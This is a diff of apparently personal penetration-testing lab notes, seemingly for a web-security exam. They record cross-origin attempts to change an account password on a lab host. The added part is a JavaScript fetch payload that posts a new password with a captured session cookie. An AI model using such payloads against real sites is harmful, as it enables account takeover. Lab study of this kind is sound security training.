@@ -269,7 +269,7 @@ fetch("https://localhost:8443/api/me/password", {
 });
 ```
 attempted using `payload4` gt a `MissingAllowOriginHeader`
-![[Pasted image 20250919181110.png]]
+![[ss-20250919-OSWA-Exam-ShareNotez-pic16.png]]
 working header  - going to test with the `sessiontoken` 
 ```bash
 fetch("https://192.168.62.62:8443/api/me/password", {
@@ -360,4 +360,31 @@ Priority: u=1, i
 Connection: keep-alive
 
 password=testtesttest
+```
+using 
+https://curlconverter.com/javascript/ to generate `payload8`
+```bash
+fetch('https://192.168.62.62:8443/api/me/password', {
+  method: 'POST',
+  headers: {
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+    'origin': 'http://192.168.62.62',
+    'priority': 'u=1, i',
+    'referer': 'http://192.168.62.62/',
+    'sec-ch-ua': '"Not=A?Brand";v="24", "Chromium";v="140"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-storage-access': 'active',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
+    'cookie': 'sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzIxMjUyLCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.glYKmvOwHXKRKNWVct9SOfoIiCKzlP3YIbgFdbIYG_s'
+  },
+  body: new URLSearchParams({
+    'password': 'testtesttest'
+  })
+});
 ```
